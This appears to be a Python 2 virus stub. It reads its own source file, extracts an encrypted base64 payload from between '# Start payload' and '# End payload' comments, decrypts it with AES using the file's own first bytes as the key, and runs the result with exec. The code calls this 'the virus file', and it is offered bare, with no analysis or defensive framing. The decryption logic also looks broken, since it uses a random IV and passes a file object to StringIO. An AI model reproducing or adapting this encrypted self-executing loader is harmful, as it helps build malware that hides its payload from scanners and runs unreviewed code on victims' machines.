print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload